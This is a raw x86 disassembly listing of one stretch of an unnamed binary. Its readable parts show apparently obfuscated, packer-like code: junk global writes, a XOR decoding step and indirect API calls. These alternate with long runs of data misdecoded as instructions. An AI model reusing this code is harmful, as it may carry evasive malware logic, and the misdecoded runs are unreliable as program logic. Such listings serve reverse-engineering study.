  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	jmp    0x410b13
  410b22:	pop    esi
  410b23:	dec    ebx
  410b24:	or     eax,0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b8c
  410b2d:	sbb    ebp,0x3d
  410b30:	(bad)  [ebx]
  410b32:	or     BYTE PTR [ebp+0x9],cl
  410b35:	fstp   TBYTE PTR [esi+0x4c]
  410b38:	jbe    0x410b99
  410b3a:	inc    ecx
  410b3b:	rol    BYTE PTR ds:0xf917e838,0xa2
  410b42:	adc    DWORD PTR [ebp-0x2f],eax
  410b45:	fadd   DWORD PTR [eax]
  410b47:	pusha  
  410b48:	int3   
  410b49:	xlat   BYTE PTR ds:[ebx]
  410b4a:	aaa    
  410b4b:	mov    ecx,0x97fecf4
  410b50:	arpl   WORD PTR [edx+0x2f],bx
  410b53:	sub    al,0x70
  410b55:	adc    edx,DWORD PTR [esi+ebx*4-0x369fcf8d]
  410b5c:	cmp    eax,0xfa05424
  410b61:	mov    ebx,DWORD PTR [ebx-0x3d]
  410b64:	test   dh,dl
  410b66:	adc    al,0xcf
  410b69:	in     al,0x83
  410b6b:	mov    esi,0xe5dbd3a7
  410b70:	jae    0x410bb4
  410b72:	xchg   BYTE PTR [ecx+edi*8],bh
  410b75:	pop    ds
  410b76:	dec    esi
  410b77:	(bad)  [edi-0x51]
  410b7a:	mov    edx,0x92d30856
  410b7f:	push   esi
  410b80:	xchg   edi,eax
  410b81:	data16 jns 0x410b9c
  410b84:	rcl    DWORD PTR [eax-0x13f1b0ff],1
  410b8a:	and    al,0xa
  410b8c:	or     cl,BYTE PTR [edi]
  410b8e:	stc    
  410b8f:	fcmovu st,st(4)
  410b91:	fstp   TBYTE PTR [esi]
  410b93:	stc    
  410b94:	lods   eax,DWORD PTR ds:[esi]
  410b95:	dec    ebx
  410b96:	sub    al,0xe2
  410b98:	push   esp
  410b99:	and    eax,0x5fe40932
  410b9e:	das    
  410b9f:	mov    al,0x23
  410ba1:	cmp    ebx,DWORD PTR [ebp-0x3b250978]
  410ba7:	(bad)  
  410ba8:	push   eax
  410ba9:	aas    
  410baa:	xchg   edi,eax
  410bab:	aam    0x35
  410bad:	retf   0x334d
  410bb0:	test   eax,0x55b8ed10
  410bb5:	jle    0x410bd0
  410bb7:	jmp    0x410c1e
  410bb9:	outs   dx,DWORD PTR ds:[esi]
  410bba:	mov    al,ds:0xc5ed4eb7
  410bbf:	fidiv  WORD PTR [ecx+0x342ad86c]
  410bc5:	fadd   QWORD PTR [ecx-0x51]
  410bc8:	stos   DWORD PTR es:[edi],eax
  410bc9:	popa   
  410bca:	ret    0xeb64
  410bcd:	xchg   ebp,eax
  410bce:	mov    ah,0x63
  410bd0:	mov    esp,0xe20ca256
  410bd5:	fistp  WORD PTR [esi-0xd78dce]
  410bdb:	or     esp,0x7b
  410bde:	imul   BYTE PTR [ecx+ebp*2]
  410be1:	je     0x410bdd
  410be3:	stos   BYTE PTR es:[edi],al
  410be4:	addr16 xor eax,0xb37ecb24
  410bea:	aaa    
  410beb:	mov    esi,0x19b9fac1
  410bf0:	sub    BYTE PTR [eax+0x70],ch
  410bf3:	push   ebp
  410bf4:	call   0xff70:0x72b82678
  410bfb:	push   edi
  410bfc:	mov    edi,0xbfe05ea6
  410c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c02:	jmp    0xcd0:0x148a5bd0
  410c09:	jbe    0x410c2e
  410c0b:	pop    ebp
  410c0c:	fistp  DWORD PTR [edi+0x0]
  410c0f:	inc    edi
  410c10:	out    dx,al
  410c11:	pop    eax
  410c12:	sub    cl,BYTE PTR [edi]
  410c14:	fst    DWORD PTR [eax-0x63]
  410c17:	cmc    
  410c18:	jl     0x410bc3
  410c1a:	imul   cl
  410c1c:	cmp    BYTE PTR [ebp+0x3a8f7361],0x28
  410c23:	call   0x107e:0x9737bf2d
  410c2a:	adc    al,BYTE PTR ds:0x754db857
  410c30:	sbb    DWORD PTR [ecx+0x6a322265],eax
  410c36:	jmp    0x410c98
  410c38:	dec    esi
  410c39:	add    ecx,DWORD PTR [esi]
  410c3b:	fcomp  DWORD PTR [ebp+0x40f20b88]
  410c41:	sbb    DWORD PTR [esi],eax
  410c43:	mov    dh,0x58
  410c45:	inc    ebp
  410c46:	mov    es,WORD PTR [esi+0x453aa6bf]
  410c4c:	adc    dh,BYTE PTR [ecx-0x6]
  410c4f:	push   cs
  410c50:	xchg   DWORD PTR [eax-0x7ec182fc],ebx
  410c56:	adc    DWORD PTR [ebp+0xb],ebp
  410c59:	mov    ah,0xd6
  410c5b:	sbb    DWORD PTR [ebx-0x24],ebp
  410c5e:	mov    BYTE PTR [edx-0x1862ceef],bl
  410c64:	mov    bl,0x4b
  410c66:	ja     0x410cca
  410c68:	(bad)  
  410c69:	xor    al,0x59
  410c6b:	lods   eax,DWORD PTR ds:[esi]
  410c6c:	fstp   QWORD PTR [esi-0x6a]
  410c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c70:	and    eax,0x9ac19fea
  410c75:	fsubr  st(2),st
  410c77:	in     al,dx
  410c78:	in     eax,dx
  410c79:	out    dx,eax
  410c7a:	(bad)  
  410c7b:	out    dx,al
  410c7c:	pop    esi
  410c7d:	or     al,0xdd
  410c7f:	or     al,0x37
  410c81:	cdq    
  410c82:	sbb    esi,DWORD PTR [esi-0x24]
  410c85:	push   edx
  410c86:	je     0x410cf3
  410c88:	mov    bh,0xe0
  410c8a:	pop    ss
  410c8b:	sar    BYTE PTR [esi-0x3a1553ea],cl
  410c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c92:	int3   
  410c93:	mov    ecx,cs
  410c95:	mov    bh,0xbd
  410c97:	test   eax,0xf090d8f9
  410c9c:	mov    edi,0x131f2d8b
  410ca1:	sbb    dh,ch
  410ca3:	adc    cl,cl
  410ca5:	cli    
  410ca6:	stc    
  410ca7:	cwde   
  410ca8:	mov    ecx,0x45c7ee12
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    bl,BYTE PTR [ecx-0x30]
  410dce:	ror    al,cl
  410dd0:	mov    WORD PTR [edi+0x7e],es
  410dd3:	jle    0x410dc6
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410d78
  410dd9:	repz adc DWORD PTR [esp+ebx*8-0x5c],ecx
  410dde:	repz sub ah,BYTE PTR [edx+0x5342e377]
  410de5:	xchg   esi,eax
  410de6:	push   edi
  410de7:	cmp    ch,ch
  410de9:	shl    eax,cl
  410deb:	ds add eax,0xfe633d76
  410df1:	mov    bh,0x8
  410df3:	sbb    DWORD PTR [ebp+ebx*1+0x67],ebx
  410df7:	arpl   WORD PTR [edi],bp
  410df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dfb:	jmp    0x410de7
  410dfd:	in     eax,0xb8
  410dff:	jg     0x410da2
  410e01:	push   ss
  410e02:	sub    edi,ecx
  410e04:	rep stos BYTE PTR es:[edi],al
  410e06:	cli    
  410e07:	scas   al,BYTE PTR es:[edi]
  410e08:	push   ecx
  410e09:	sbb    eax,0xbfbfd531
  410e0e:	xor    eax,0x18f34e2b
  410e13:	jbe    0x410dd7
  410e15:	pop    esi
  410e16:	xchg   edi,eax
  410e17:	and    BYTE PTR [eax],al
  410e19:	sbb    ah,bh
  410e1b:	or     ebx,DWORD PTR [ebp+0x0]
  410e1e:	aam    0xf4
  410e20:	jg     0x410e1e
  410e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e23:	pop    edx
  410e24:	stos   DWORD PTR es:[edi],eax
  410e25:	addr16 in eax,dx
  410e27:	jae    0x410e9e
  410e29:	fcmovb st,st(1)
  410e2b:	aad    0xb2
  410e2d:	pop    ebp
  410e2e:	sbb    bl,BYTE PTR [esi]
  410e30:	inc    ebp
  410e31:	mov    bh,0x81
  410e33:	inc    edx
  410e34:	jle    0x410e2b
  410e36:	mov    BYTE PTR [ebx+0x60d5d79a],dh
  410e3c:	sub    BYTE PTR [ebx],0x6f
  410e3f:	ficomp DWORD PTR [ecx]
  410e41:	jecxz  0x410e7b
  410e43:	jmp    0x351db7aa
  410e48:	push   0xc282e6f4
  410e4d:	lods   al,BYTE PTR ds:[esi]
  410e4e:	inc    esp
  410e4f:	in     eax,0x39
  410e51:	mov    dl,0xc8
  410e53:	ret    0xc532
  410e56:	jo     0x410eae
  410e58:	stos   BYTE PTR es:[edi],al
  410e59:	ja     0x410e87
  410e5b:	mov    edx,0x76a3db9b
  410e60:	pusha  
  410e61:	mov    dl,0x4b
  410e63:	mov    al,ds:0xd6d5f5ee
  410e68:	clc    
  410e69:	xor    al,0x1
  410e6b:	jbe    0x410edc
  410e6d:	or     BYTE PTR [edx],ah
  410e6f:	xor    edx,ebx
  410e71:	sub    BYTE PTR [eax+ecx*8],dh
  410e74:	inc    edx
  410e75:	or     DWORD PTR [edi],ebx
  410e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e78:	or     DWORD PTR [ebp+ebp*4-0x7880bb20],eax
  410e7f:	ss jmp 0x410e78
  410e82:	fidivr DWORD PTR [ecx+edi*1]
  410e85:	adc    DWORD PTR [edi-0x2e],ebp
  410e88:	imul   esp,ebx,0xffffffb4
  410e8b:	or     ch,BYTE PTR [eax]
  410e8d:	mov    edx,0x8cba703e
  410e92:	xor    al,0xc6
  410e94:	ins    DWORD PTR es:[edi],dx
  410e95:	ror    DWORD PTR [esi],cl
  410e97:	fdivr  DWORD PTR [ebp-0x4257b543]
  410e9d:	jb     0x410e5c
  410e9f:	not    DWORD PTR [edx]
  410ea1:	dec    esi
  410ea2:	sub    al,BYTE PTR [edi]
  410ea4:	mov    edi,0xdf1ec19a
  410ea9:	outs   dx,BYTE PTR ds:[esi]
  410eaa:	mov    es,WORD PTR [esi+0x16]
  410ead:	cmp    eax,0x4e79c6fa
  410eb2:	mov    ecx,0xf4fadad4
  410eb7:	std    
  410eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eb9:	ret    0x3111
  410ebc:	in     eax,dx
  410ebd:	jmp    0x410eb2
  410ebf:	mov    ebx,0x46cabc66
  410ec4:	xchg   edi,eax
  410ec5:	stos   BYTE PTR es:[edi],al
  410ec6:	mov    bl,0x31
  410ec8:	adc    DWORD PTR [edx],0xffffffc5
  410ecb:	in     eax,0x4
  410ecd:	push   cs
  410ece:	dec    eax
  410ecf:	pop    esi
  410ed0:	cdq    
  410ed1:	jl     0x410e54
  410ed3:	xchg   esp,eax
  410ed4:	es xor al,0xf0
  410ed7:	stos   DWORD PTR es:[edi],eax
  410ed8:	outs   dx,DWORD PTR ds:[esi]
  410ed9:	mov    bh,0x77
  410edb:	into   
  410edc:	xchg   BYTE PTR [eax],dh
  410ede:	lods   eax,DWORD PTR ds:[esi]
  410edf:	fmul   DWORD PTR [ecx+0x1505cd0d]
  410ee5:	in     eax,0x64
  410ee7:	sub    edi,DWORD PTR [esi]
  410ee9:	clc    
  410eea:	mov    esp,DWORD PTR [edi-0x40af81ad]
  410ef0:	xchg   DWORD PTR [ebx-0x23],ebx
  410ef3:	je     0x410f23
  410ef5:	mul    DWORD PTR [ecx-0x304f5c4c]
  410efb:	pop    esp
  410efc:	push   edi
  410efd:	sbb    cl,BYTE PTR [ebp+edi*4+0x1e6b8d1c]
  410f04:	mov    dl,dl
  410f06:	nop
  410f07:	cmp    BYTE PTR [esi+ebx*2-0x45],ch
  410f0b:	mov    eax,0xc98ec51f
  410f10:	add    ecx,DWORD PTR [edi-0x37]
  410f13:	or     cl,BYTE PTR [eax]
  410f15:	jle    0x410f76
  410f17:	lock in eax,dx
  410f19:	ds hlt 
  410f1b:	out    0xe3,eax
  410f1d:	lods   al,BYTE PTR ds:[esi]
  410f1e:	iret   
  410f1f:	dec    edx
  410f20:	mov    ecx,0x8bf09886
  410f25:	test   eax,0xf35d8112
  410f2a:	or     DWORD PTR [esi+esi*8],0xa2360ca8
  410f31:	jg     0x410ebd
  410f33:	cld    
  410f34:	sub    DWORD PTR ds:[ebx+0x1c],ebx
  410f38:	sub    DWORD PTR [ebx+0x2e],ebx
  410f3b:	jmp    0x410ef6
  410f3d:	xchg   DWORD PTR gs:[esi+0x21],eax
  410f41:	push   edx
  410f42:	outs   dx,DWORD PTR ds:[esi]
  410f43:	daa    
  410f44:	rcl    DWORD PTR [edx+0x7d580f2a],0x10
  410f4b:	add    DWORD PTR [edi+ebx*8],edx
  410f4e:	sar    DWORD PTR [edx+0x76],1
  410f51:	push   ebx
  410f52:	mov    esp,0xedb13b65
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	les    eax,FWORD PTR [ecx+0x49]
  410ffb:	(bad)  
  410ffc:	cmovne edi,DWORD PTR [esi+0x7e]
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x41107d
  411005:	(bad)  
  411006:	(bad)  [edi-0x1b]
  411009:	faddp  st(7),st
  41100b:	in     eax,dx
  41100c:	out    0x6b,al
  41100e:	stos   DWORD PTR es:[edi],eax
  41100f:	(bad)  
  411010:	pusha  
  411011:	cli    
  411012:	sti    
  411013:	jno    0x410fe0
  411015:	jp     0x41104c
  411017:	jno    0x410fb0
  411019:	and    eax,0x4ec6ebc8
  41101e:	retf   0xe892
  411021:	inc    ebp
  411022:	aaa    
  411023:	mov    DWORD PTR [edx-0x4c6a03f],ecx
  411029:	add    BYTE PTR ds:0xb0b09521,ah
  41102f:	or     esp,DWORD PTR [edi+0x27]
  411032:	mov    esi,0x8e5200ad
  411037:	and    edx,DWORD PTR [ecx+0x27]
  41103a:	xchg   edi,eax
  41103b:	jmp    0x411088
  41103d:	dec    ebp
  41103e:	and    al,BYTE PTR [eax+0x7ab2e57c]
  411044:	inc    edi
  411045:	jbe    0x411063
  411047:	adc    ebx,DWORD PTR es:[edx]
  41104a:	jle    0x411045
  41104c:	add    DWORD PTR [ecx-0x4a27d9f0],eax
  411052:	pop    edi
  411053:	adc    BYTE PTR [edx+ecx*4],ch
  411056:	cmp    DWORD PTR [ebx-0x219798af],edi
  41105c:	mov    ch,0xa
  41105e:	out    0x7e,eax
  411060:	retf   0xb8a
  411063:	mov    dl,0x9d
  411065:	sbb    edi,DWORD PTR [ecx-0x69b5cfc9]
  41106b:	or     DWORD PTR [edi-0x4137987c],ebx
  411071:	or     al,0x21
  411073:	pop    ebp
  411074:	mov    dl,0x5e
  411076:	clc    
  411077:	cmp    dl,al
  411079:	jmp    0x41101e
  41107b:	cld    
  41107c:	pop    ebx
  41107d:	jp     0x4110a9
  41107f:	lods   al,BYTE PTR ds:[esi]
  411080:	push   edx
  411081:	fist   WORD PTR [ebx]
  411083:	mov    BYTE PTR [esi+ebx*1+0x263a03ca],bh
  41108a:	mov    bl,0xa9
  41108c:	cli    
  41108d:	dec    esp
  41108e:	repnz mov ebp,0x37e91098
  411094:	and    eax,esi
  411096:	jg     0x4110ed
  411098:	jle    0x4110e6
  41109a:	and    eax,0x3de7ab4a
  41109f:	mov    esp,0x756bbe4c
  4110a4:	sub    eax,0x5b19ee15
  4110a9:	sbb    al,0x3f
  4110ab:	push   ebp
  4110ac:	and    BYTE PTR [esi+0x20243f88],0x86
  4110b3:	imul   edi,DWORD PTR [edx+0x619ee2df],0x63c29db
  4110bd:	push   ebp
  4110be:	mov    ecx,0xb1cef0e5
  4110c3:	in     al,0xc8
  4110c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c6:	jns    0x4110b4
  4110c8:	mov    edx,0xaa608d75
  4110cd:	xor    DWORD PTR [esp+ecx*1+0x55a11313],esp
  4110d4:	bound  ecx,QWORD PTR [ecx]
  4110d6:	pop    ds
  4110d7:	popa   
  4110d8:	ret    0x7154
  4110db:	push   0xffffffd4
  4110dd:	mov    dh,0x16
  4110df:	and    eax,0xae828748
  4110e4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e6:	jp     0x41111d
  4110e8:	mov    WORD PTR ds:0x9b6b45e3,ds
  4110ee:	adc    al,0xfc
  4110f0:	repz dec ebp
  4110f2:	jl     0x4110c9
  4110f4:	dec    edi
  4110f5:	pop    eax
  4110f6:	sub    DWORD PTR [edi+esi*8+0x16],eax
  4110fa:	outs   dx,DWORD PTR ds:[esi]
  4110fb:	cmc    
  4110fc:	or     DWORD PTR [edx-0x7b],eax
  4110ff:	test   DWORD PTR ds:0xd4478314,edx
  411105:	add    BYTE PTR [ecx],bl
  411107:	cmc    
  411108:	dec    esi
  411109:	popa   
  41110a:	cs pop ss
  41110c:	fisttp WORD PTR [esi+0x225d1f3]
  411112:	pop    es
  411113:	into   
  411114:	shl    BYTE PTR [ebx],cl
  411116:	popf   
  411117:	nop
  411118:	mov    ch,0x2b
  41111a:	cmp    al,BYTE PTR [edi]
  41111c:	push   0x34
  41111e:	pop    edi
  41111f:	cmc    
  411120:	adc    al,ah
  411122:	mov    ah,0x70
  411124:	sbb    esi,DWORD PTR [edi-0x5b9f936d]
  41112a:	xchg   BYTE PTR [edi-0x333e44fe],ch
  411130:	or     al,0x13
  411132:	jle    0x411160
  411134:	or     eax,0x58d9fce7
  411139:	rcl    DWORD PTR [esi],cl
  41113b:	adc    al,0x2b
  41113d:	inc    eax
  41113e:	or     eax,0x1ec2774e
  411143:	aas    
  411144:	mov    ch,0xda
  411146:	xchg   ecx,eax
  411147:	outs   dx,DWORD PTR ds:[esi]
  411148:	ins    DWORD PTR es:[edi],dx
  411149:	sbb    eax,0x686970f3
  41114e:	sbb    al,0x32
  411150:	cmp    al,0x34
  411152:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411154:	cmp    DWORD PTR [edx-0x9],esi
  411157:	and    esi,esp
  411159:	dec    esp
  41115a:	fisttp WORD PTR [edi-0x1bb5e59e]
  411160:	push   ebx
  411161:	add    BYTE PTR [ebx-0xb151c03],ch
  411167:	add    BYTE PTR [eax-0x232725a],bl
  41116d:	das    
  41116e:	rol    DWORD PTR [ecx],cl
  411170:	gs fwait
  411172:	cmp    ebx,DWORD PTR [ecx]
  411174:	nop
  411175:	(bad)  
  411177:	das    
  411178:	scas   al,BYTE PTR es:[edi]
  411179:	cmovno ecx,ebp
  41117c:	lea    eax,[ebx-0x16c0e27a]
  411182:	dec    esi
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xd7dabba7
  4111f1:	jo     0x41118d
  4111f3:	aaa    
  4111f4:	mov    es,WORD PTR [edx+0x7e]
  4111f7:	jle    0x4111ea
  4111f9:	jg     0x411279
  4111fb:	jle    0x4111b9
  4111fd:	mov    bl,0xe0
  4111ff:	jl     0x4111a4
  411201:	pop    ebp
  411202:	loope  0x41127c
  411204:	daa    
  411205:	push   esi
  411206:	inc    ecx
  411207:	pushf  
  411208:	lock outs dx,BYTE PTR ds:[esi]
  41120a:	push   ebp
  41120b:	out    dx,al
  41120c:	(bad)  
  41120d:	push   esp
  41120e:	mov    ds:0x2cc5f73f,eax
  411213:	inc    esp
  411214:	sbb    DWORD PTR [esi+0x43],esp
  411217:	and    DWORD PTR [ebp+0x2e],edi
  41121a:	aaa    
  41121b:	loopne 0x411270
  41121d:	cdq    
  41121e:	(bad)  
  41121f:	pusha  
  411220:	mov    al,ds:0xc1d0d888
  411225:	hlt    
  411226:	or     edi,DWORD PTR [esi+ebp*8+0x2c531b9]
  41122d:	push   ds
  41122e:	out    dx,al
  41122f:	dec    ebx
  411230:	out    dx,eax
  411231:	mov    esp,0xd403bf6a
  411236:	jg     0x4111f4
  411238:	mov    cl,0x46
  41123a:	cmp    cl,ch
  41123c:	rcr    cl,1
  41123e:	dec    ecx
  41123f:	std    
  411240:	jle    0x41126d
  411242:	inc    edi
  411243:	bound  eax,QWORD PTR [eax]
  411245:	ins    BYTE PTR es:[edi],dx
  411246:	push   esi
  411247:	or     DWORD PTR [ecx-0x25bffe04],0x92bc3df0
  411251:	mov    bh,0x6f
  411253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411254:	sbb    al,0xf
  411256:	or     BYTE PTR [ecx+0x4e8a398c],bl
  41125c:	xor    al,0xcf
  41125e:	int3   
  41125f:	xchg   al,bl
  411261:	(bad)  
  411262:	hlt    
  411263:	shr    dh,1
  411265:	inc    ecx
  411266:	loop   0x41120d
  411268:	fstp   QWORD PTR [edx]
  41126a:	push   edi
  41126b:	sub    BYTE PTR [ebp-0x6719e6be],dl
  411271:	sar    edx,1
  411273:	scas   al,BYTE PTR es:[edi]
  411274:	imul   ecx,DWORD PTR [ebx],0xffffff9a
  411277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411278:	mov    ah,0x55
  41127a:	test   eax,0xbae38439
  41127f:	push   es
  411280:	je     0x411236
  411282:	jl     0x411262
  411284:	push   esp
  411285:	cmp    eax,0x2043d5c3
  41128a:	sub    eax,0xc5b4723e
  41128f:	int3   
  411290:	in     eax,dx
  411291:	loop   0x411267
  411293:	pop    ebx
  411294:	outs   dx,DWORD PTR ds:[esi]
  411295:	ja     0x41128f
  411297:	jbe    0x4112b8
  411299:	jns    0x41129b
  41129b:	fxch   st(7)
  41129d:	pop    ebx
  41129e:	rcr    BYTE PTR [edx+0x7bfe3f57],cl
  4112a4:	pop    ebx
  4112a5:	xchg   DWORD PTR [eax+0xb],esi
  4112a8:	push   eax
  4112a9:	cmp    al,0x71
  4112ab:	sub    BYTE PTR [ebp+0x39],0x74
  4112af:	adc    eax,0x505b7e33
  4112b4:	or     ah,bl
  4112b6:	mov    edx,0x75845163
  4112bb:	mov    edi,0x6f057a60
  4112c0:	out    0x70,al
  4112c2:	jg     0x4112d3
  4112c4:	dec    edi
  4112c5:	mov    esp,0x9e4c1e61
  4112ca:	xchg   esp,eax
  4112cb:	inc    ebx
  4112cc:	cmc    
  4112cd:	mov    WORD PTR [ebx+ebx*8],ss
  4112d0:	sub    cl,al
  4112d2:	leave  
  4112d3:	bt     esi,ebx
  4112d6:	cs xor bl,ah
  4112d9:	jnp    0x4112fd
  4112db:	rcl    DWORD PTR fs:[edx+0x75bc3b6e],1
  4112e2:	jo     0x4112c9
